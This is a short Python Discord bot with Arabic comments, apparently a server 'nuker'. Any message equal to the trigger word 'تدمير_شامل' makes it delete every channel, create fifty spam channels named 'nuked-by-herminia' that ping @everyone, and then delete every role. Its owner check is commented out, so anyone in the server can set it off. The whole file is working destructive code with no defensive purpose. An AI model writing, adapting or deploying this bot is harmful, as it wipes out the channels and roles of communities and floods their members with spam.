import discord
from discord.ext import commands
import os
import asyncio

# إعدادات البوت - تأكد من تفعيل الـ Intents في صفحة المطورين
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="", intents=intents)

@bot.event
async def on_ready():
    print(f'تم تشغيل العقل المدمر باسم: {bot.user}')

@bot.event
async def on_message(message):
    # إذا كتبت الكلمة السحرية في أي روم
    if message.content == "تدمير_شامل":
        # التأكد أنك أنت فقط من يعطي الأمر (اختياري: ضع ID حسابك هنا)
        # if message.author.id != YOUR_ID: return

        print(f"بدء عملية التدمير الشامل في سيرفر: {message.guild.name}")

        # 1. مسح جميع الرومات
        for channel in message.guild.channels:
            try:
                await channel.delete()
            except:
                continue

        # 2. إنشاء رومات جديدة بكثافة وإرسال رسائل سبام
        for i in range(50):
            new_channel = await message.guild.create_text_channel(name=f"nuked-by-herminia-{i}")
            # إرسال رسائل تكرارية داخل الرومات الجديدة
            await new_channel.send("@everyone السيرفر انهار! 💀💀")
            await new_channel.send("https://tenor.com/view/explosion-boom-blast-nuclear-gif-14674724")

        # 3. مسح جميع الرتب (Roles)
        for role in message.guild.roles:
            try:
                await role.delete()
            except:
                continue

    await bot.process_commands(message)

# تشغيل البوت باستخدام التوكن المخزن في Render
token = os.environ.get("BOT_TOKEN")
bot.run(token)
